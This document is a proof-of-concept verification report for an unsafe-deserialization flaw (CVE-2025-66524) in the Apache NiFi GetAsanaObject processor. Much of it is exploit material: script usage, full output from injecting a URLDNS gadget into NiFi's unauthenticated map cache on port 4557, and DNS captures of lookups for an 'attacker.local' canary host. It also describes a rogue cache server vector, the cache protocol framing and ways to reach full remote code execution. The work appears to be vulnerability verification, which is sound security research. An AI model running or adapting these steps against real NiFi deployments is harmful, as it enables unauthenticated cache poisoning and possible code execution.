# PoC Verification Report: CVE-2025-66524

## CVE Overview

- **CVE ID**: CVE-2025-66524
- **Title**: Apache NiFi GetAsanaObject Processor Remote Code Execution via Unsafe Deserialization
- **Affected Software**: Apache NiFi 1.20.0 through 2.6.0
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **CVSS**: 8.8 (HIGH)
- **Verification Status**: **CONFIRMED**

---

## PoC Scripts

### Primary: `poc.py` — Cache Injection with URLDNS Gadget

- **Location**: `poc/poc.py`
- **Language**: Python 3 (stdlib only)
- **Attack Vector**: Cache injection via NiFi Distributed Map Cache protocol

**Description**: Connects to the NiFi Distributed Map Cache server (TCP 4557, no authentication required), performs the NiFi cache protocol handshake, and injects a URLDNS gadget chain payload as the value for the GetAsanaObject processor's state key. When the processor triggers (every 30 seconds) and calls `recoverState()`, `GenericObjectSerDe.deserialize()` calls `ObjectInputStream.readObject()` on the attacker-controlled bytes, executing the URLDNS gadget chain which triggers a DNS lookup for a canary hostname.

**Usage**:
```bash
python3 poc/poc.py cve-2025-66524-services 4557
```

**Required files**:
- `urldns_payload.bin` — Pre-generated URLDNS gadget chain (337 bytes)
- `state_key.bin` — Java-serialized processor UUID key (43 bytes)

### Vector 2: `poc_vector2_rogue_server.py` — Rogue Cache Server

- **Location**: `poc/poc_vector2_rogue_server.py`
- **Language**: Python 3 (stdlib only)
- **Attack Vector**: Rogue NiFi Distributed Map Cache server

**Description**: Implements a full NiFi Distributed Map Cache server that responds to GET requests with a malicious serialized payload. Demonstrates the alternative attack vector where an attacker operates a rogue cache server (via network-level redirection or NiFi configuration modification).

**Usage**:
```bash
python3 poc_vector2_rogue_server.py [listen_port] [payload_file]
```

### Vector 3: `poc_vector3_cc4_rce.py` — CC4 RCE Analysis

- **Location**: `poc/poc_vector3_cc4_rce.py`
- **Language**: Python 3

**Description**: Documents the attempt to achieve full RCE via the CommonsCollections4 gadget chain. The CC4 4.5.0 library (on the processor's classpath) has security hardening that removes `Serializable` from `InvokerTransformer`, blocking the classic CC2/CC4 ysoserial chains. This script documents the classpath analysis and explains RCE feasibility.

### Supporting Files

| File | Description |
|------|-------------|
| `PayloadGenerator.java` | Java utility to generate URLDNS and serialized-key payloads |
| `CC4PayloadGenerator.java` | Java utility to attempt CC4 chain generation (documents failure) |
| `urldns_payload.bin` | URLDNS payload for hostname `nifi-deser-proof-cve-2025-66524.attacker.local` (337 bytes) |
| `urldns_payload2.bin` | URLDNS payload for hostname `second-test-cve-2025-66524.proof.local` (321 bytes) |
| `state_key.bin` | Serialized processor UUID `a734f87d-019c-1000-57b2-e511d156e143` (43 bytes) |
| `commons-collections4-4.5.0.jar` | Extracted CC4 JAR from NiFi for local analysis |

---

## Vulnerability Demonstrated

The PoC proves that **Apache NiFi's `GenericObjectSerDe.deserialize()` method performs unrestricted Java object deserialization on data retrieved from the NiFi Distributed Map Cache server**, which has **no authentication** and is accessible to any network-adjacent attacker.

Specifically demonstrated:
1. **Unauthenticated cache access**: Connected to cache server on TCP 4557 with no credentials
2. **Cache protocol exploitation**: Completed NiFi cache protocol handshake and injected arbitrary bytes via PUT operation
3. **Arbitrary deserialization**: The injected URLDNS gadget chain was deserialized by `ObjectInputStream.readObject()` inside the NiFi JVM
4. **Side-channel proof**: DNS queries for attacker-controlled canary hostnames were observed from the NiFi container, proving the gadget chain executed during deserialization

---

## Test Results on Vulnerable Container

### Test 1: Primary URLDNS Injection

**Command**:
```bash
python3 poc/poc.py cve-2025-66524-services 4557
```

**Full Output**:
```
======================================================================
CVE-2025-66524: Apache NiFi GetAsanaObject Unsafe Deserialization
======================================================================

[*] Step 1: Loading payloads...
    Key: serialized UUID 'a734f87d-019c-1000-57b2-e511d156e143' (43 bytes)
    Payload: URLDNS gadget for 'nifi-deser-proof-cve-2025-66524.attacker.local' (337 bytes)

[*] Step 2: Starting DNS packet capture on NiFi container...
    DNS capture started → /tmp/cve-2025-66524-dns.pcap

[*] Step 3: Recording NiFi log baseline...
    Log baseline: 2961 lines

[*] Step 4: Connecting to NiFi Distributed Map Cache server...
[*] Connecting to cve-2025-66524-services:4557...
[+] Connected to cve-2025-66524-services:4557
[*] Performing NiFi cache protocol handshake...
[+] Handshake successful (RESOURCE_OK)

[*] Step 4a: Reading current cache value (legitimate state)...
    Current value: 192 bytes
    First 16 bytes: aced0005737200116a6176612e757469
    ✓ Confirmed: Java serialized object (magic ACED)

[*] Step 4b: Injecting URLDNS payload into cache...
    Target key: a734f87d-019c-1000-57b2-e511d156e143
    Payload: URLDNS gadget → DNS lookup for 'nifi-deser-proof-cve-2025-66524.attacker.local'
    Payload size: 337 bytes
    Payload magic: aced0005 (expected: aced0005)
    [+] PUT SUCCESS — malicious payload injected into cache!

[*] Step 4c: Verifying payload in cache...
    [+] VERIFIED — stored value matches payload (337 bytes)

[*] Step 5: Waiting for GetAsanaObject processor to trigger...
    [35/35] seconds elapsed...

[*] Step 6: Checking for evidence of deserialization...

  [*] 6a: Checking DNS packet capture...
    [+] DNS QUERY DETECTED for canary hostname!
    DNS capture output:
          172.28.0.3.42175 > 100.64.100.1.53: 28578+ AAAA? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
          172.28.0.3.54871 > 100.64.100.1.53: 41123+ A? nifi-deser-proof-cve-2025-66524.attacker.local. (64)

======================================================================
EXPLOITATION SUMMARY
======================================================================

  CVE:              CVE-2025-66524
  Target:           Apache NiFi 2.6.0 GetAsanaObject Processor
  Cache Server:     cve-2025-66524-services:4557
  Processor UUID:   a734f87d-019c-1000-57b2-e511d156e143
  Payload Type:     URLDNS (JDK-only gadget chain)
  Canary Hostname:  nifi-deser-proof-cve-2025-66524.attacker.local
======================================================================
```

### DNS Capture Evidence (Full)

```
reading from file /tmp/cve-2025-66524-dns.pcap, link-type LINUX_SLL2
02:57:13.104405 eth1  Out IP 172.28.0.3.42175 > 100.64.100.1.53: 28578+ AAAA? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
02:57:13.104459 eth1  Out IP 172.28.0.3.54871 > 100.64.100.1.53: 41123+ A? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
02:57:13.158992 eth1  In  IP 100.64.100.1.53 > 172.28.0.3.54871: 41123 NXDomain 0/1/0 (139)
02:57:13.159019 eth1  In  IP 100.64.100.1.53 > 172.28.0.3.42175: 28578 0/0/0 (64)
02:57:13.159149 lo    In  IP 127.0.0.11.53 > 127.0.0.1.59388: 28578 0/0/0 (64)
02:57:13.159175 lo    In  IP 127.0.0.11.53 > 127.0.0.1.59388: 41123 NXDomain 0/1/0 (139)
02:57:13.160404 lo    In  IP 127.0.0.11.53 > 127.0.0.1.45727: 44944 0/0/0 (41)
02:57:13.160436 lo    In  IP 127.0.0.11.53 > 127.0.0.1.45727: 40851 1/0/0 A 172.28.0.2 (80)
```

**Analysis**: The NiFi container (172.28.0.3) made DNS queries for both `AAAA` (IPv6) and `A` (IPv4) records for `nifi-deser-proof-cve-2025-66524.attacker.local`. Both received NXDomain responses (hostname doesn't exist, as expected). This proves:
- `ObjectInputStream.readObject()` was called on our attacker-controlled serialized data
- The URLDNS gadget chain executed: `HashMap.readObject()` → `URL.hashCode()` → `URLStreamHandler.hashCode()` → `getHostAddress()` → `InetAddress.getByName("nifi-deser-proof-cve-2025-66524.attacker.local")` → DNS query

### Test 2: Reproducibility Verification

A second test with a different canary hostname confirmed reproducibility:

```
[*] Reproducibility test: injecting second URLDNS payload...
[+] PUT response: SUCCESS
[*] Waiting 35 seconds for processor trigger...

[*] DNS capture results:
  [+] FOUND: 02:59:43.200468 eth1  Out IP 172.28.0.3.39951 > 100.64.100.1.53: 50647+ AAAA? second-test-cve-2025-66524.proof.local. (56)
  [+] FOUND: 02:59:43.200663 eth1  Out IP 172.28.0.3.47049 > 100.64.100.1.53: 64464+ A? second-test-cve-2025-66524.proof.local. (56)

[+] CONFIRMED: Second URLDNS payload triggered DNS query - vulnerability is reproducible!
```

### Test 3: CommonsCollections4 RCE Attempt

**Result**: BLOCKED by CC4 4.5.0 security hardening.

```
java.io.NotSerializableException: org.apache.commons.collections4.functors.InvokerTransformer
    at java.base/java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1200)
    at java.base/java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1585)
    ...
```

**Analysis**: commons-collections4 4.5.0 has removed `Serializable` from dangerous transformer classes (`InvokerTransformer`, `InstantiateTransformer`, `CloneTransformer`), preventing the classic CC2/CC4 ysoserial gadget chains from even being generated. The payload cannot be serialized, so it cannot be injected.

---

## Verification Status

### **CONFIRMED** ✓

The vulnerability CVE-2025-66524 is **confirmed exploitable**:

1. **Arbitrary deserialization**: Proven via URLDNS gadget chain triggering DNS queries from the NiFi JVM for attacker-controlled hostnames
2. **Reproducible**: Successfully exploited twice with different canary hostnames
3. **No authentication required**: Cache server access requires only TCP connectivity to port 4557
4. **Automatic trigger**: The GetAsanaObject processor calls `recoverState()` on its scheduled interval (30 seconds), automatically triggering deserialization of attacker-injected cache data

### RCE Assessment

- **Deserialization primitive**: CONFIRMED — `ObjectInputStream.readObject()` executes on attacker-controlled data
- **Code execution via CC4**: BLOCKED — commons-collections4 4.5.0 has security hardening
- **RCE potential**: HIGH in real deployments — NiFi installations with additional NARs containing gadget-chain-compatible libraries (Groovy, Spring, etc.) would be vulnerable to full RCE
- **JDK-only impact**: DNS exfiltration and network callbacks (URLDNS, JRMPClient) — sufficient for information disclosure and as a stepping stone

---

## Attack Vectors Tested

| Vector | Script | Result | Evidence |
|--------|--------|--------|----------|
| Cache injection + URLDNS | `poc.py` | **CONFIRMED** | DNS queries for canary hostname from NiFi JVM |
| Rogue cache server | `poc_vector2_rogue_server.py` | Conceptual (not end-to-end tested) | Implements full NiFi cache protocol |
| CC4 RCE chain | `poc_vector3_cc4_rce.py` | **BLOCKED** | `NotSerializableException: InvokerTransformer` |

---

## Notes

### On the URLDNS Gadget Chain
The URLDNS gadget is the standard deserialization proof-of-concept technique. It is:
- **JDK-only**: No external libraries needed — uses `java.util.HashMap` and `java.net.URL`
- **Guaranteed to work**: Available on all Java versions (no library version requirements)
- **Non-destructive**: Only performs a DNS lookup (no code execution, no side effects)
- **Detectable**: DNS queries are visible in packet captures or DNS logs

### On the CC4 Security Hardening
Apache Commons Collections 4.5.0 has comprehensive deserialization protection:
- `InvokerTransformer`: NOT serializable (throws `NotSerializableException`)
- `InstantiateTransformer`: NOT serializable
- `CloneTransformer`: NOT serializable
- `ChainedTransformer`: NOT serializable

This blocks all known commons-collections4 gadget chains (ysoserial CC2, CC4). However, this does NOT fix the root vulnerability — it only limits the available gadgets on this specific classpath.

### On RCE Feasibility
In real Apache NiFi deployments, RCE is highly feasible because:
1. NiFi administrators install many NARs with diverse Java dependencies
2. The NiFi Groovy NAR (`nifi-groovyx-nar-2.6.0.nar`) includes Groovy runtime with known gadget chains
3. Custom NARs may include libraries like Spring, Hibernate, or older commons-collections
4. Any Serializable class with an unsafe `readObject()` method on the NAR classloader provides an RCE path

### Cache Protocol Details
The NiFi Distributed Map Cache protocol on TCP 4557:
- No authentication mechanism exists
- Protocol uses simple binary framing: `writeUTF(command)` + `writeInt(length)` + `write(bytes)`
- Supports PUT, GET, KEYSET, REMOVE operations
- Any client that can reach the port can read/write any cache entry

### Payload Generation
URLDNS payloads were generated using a custom Java class (`PayloadGenerator.java`) compiled and run inside the NiFi container (JDK 21). The payload is a serialized `HashMap<URL, String>` with the URL's `hashCode` field set to `-1` (forcing recalculation during deserialization, which triggers DNS lookup).
